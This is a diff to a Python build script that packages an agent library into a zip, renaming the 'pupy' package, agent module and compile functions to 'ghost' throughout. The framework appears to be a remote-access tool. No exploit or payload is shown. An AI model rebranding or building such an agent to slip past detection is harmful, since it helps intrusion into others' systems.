@@ -25,42 +25,42 @@ print("ROOT: ", ROOT)
 
 PATCHES=None
 if sys.version_info[0]==2 :
-    PATCHES = os.path.join(ROOT, 'pupy', 'library_patches_py2')
+    PATCHES = os.path.join(ROOT, 'ghost', 'library_patches_py2')
 else:
-    PATCHES = os.path.join(ROOT, 'pupy', 'library_patches_py3')
+    PATCHES = os.path.join(ROOT, 'ghost', 'library_patches_py3')
 sys.path.insert(0, PATCHES)
 
 sys.path.append(os.path.join(ROOT))
-#sys.path.append(os.path.join(ROOT, 'pupy', 'pupylib'))
+#sys.path.append(os.path.join(ROOT, 'ghost', 'ghostlib'))
 
 
 setattr(sys, "__from_build_library_zip_compiler__", True)
-from pupy.pupylib.PupyCompile import pupycompile
+from ghost.ghostlib.GhostCompile import ghostcompile
 
-sys.path.append(os.path.join(ROOT, 'pupy', 'packages', 'all'))
+sys.path.append(os.path.join(ROOT, 'ghost', 'packages', 'all'))
 
 if sys.platform == 'win32':
-    sys.path.append(os.path.join(ROOT, 'pupy', 'packages', 'windows', 'all'))
+    sys.path.append(os.path.join(ROOT, 'ghost', 'packages', 'windows', 'all'))
 elif sys.platform.startswith('linux'):
-    sys.path.append(os.path.join(ROOT, 'pupy', 'packages', 'linux', 'all'))
-    sys.path.append(os.path.join(ROOT, 'pupy', 'packages', 'posix', 'all'))
+    sys.path.append(os.path.join(ROOT, 'ghost', 'packages', 'linux', 'all'))
+    sys.path.append(os.path.join(ROOT, 'ghost', 'packages', 'posix', 'all'))
 else:
-    sys.path.append(os.path.join(ROOT, 'pupy', 'packages', 'posix', 'all'))
+    sys.path.append(os.path.join(ROOT, 'ghost', 'packages', 'posix', 'all'))
 
 import additional_imports
 
-print("Load pupy")
+print("Load ghost")
 
 try:
-    import pupy.agent
+    import ghost.agent
     print("Module loaded")
-    pupy.agent.prepare(debug=True)
+    ghost.agent.prepare(debug=True)
     print("Prepare called")
 except Exception as e:
-    print("Load pupy.. FAILED: {}".format(e))
+    print("Load ghost.. FAILED: {}".format(e))
     raise
 
-print("Load pupy.. OK")
+print("Load ghost.. OK")
 
 
 sys_modules = [
@@ -80,7 +80,7 @@ def compile_py(path):
     data = None
 
     try:
-        data = pupycompile(path, 'f:{:x}'.format(fileid), path=True)
+        data = ghostcompile(path, 'f:{:x}'.format(fileid), path=True)
         print("[C] {} -> f:{:x}".format(path, fileid))
     except ValueError:
         print("[C] {} -> failed".format(path))
@@ -102,8 +102,8 @@ all_dependencies.add('sysconfig')
 all_dependencies.add('re')
 
 exceptions = (
-    'pupy', 'pupy.agent', 'pupy.network', 'pupyimporter', 'additional_imports', 'pupy_hooks', 'pupy_modules',
-    'network', 'pupyimporter', 'additional_imports', '_openssl'
+    'ghost', 'ghost.agent', 'ghost.network', 'ghostimporter', 'additional_imports', 'ghost_hooks', 'ghost_modules',
+    'network', 'ghostimporter', 'additional_imports', '_openssl'
 )
 
 all_dependencies = sorted(list(set(all_dependencies)))
@@ -161,7 +161,7 @@ zf = zipfile.ZipFile(sys.argv[1], mode='w', compression=zipfile.ZIP_DEFLATED)
 
 zf.writestr(
     'bundlevars.pyo',
-    pupycompile(
+    ghostcompile(
         'bundlevars={}'.format(repr({
             k: v for k, v in sysconfig.get_config_vars().items()
             if k not in (
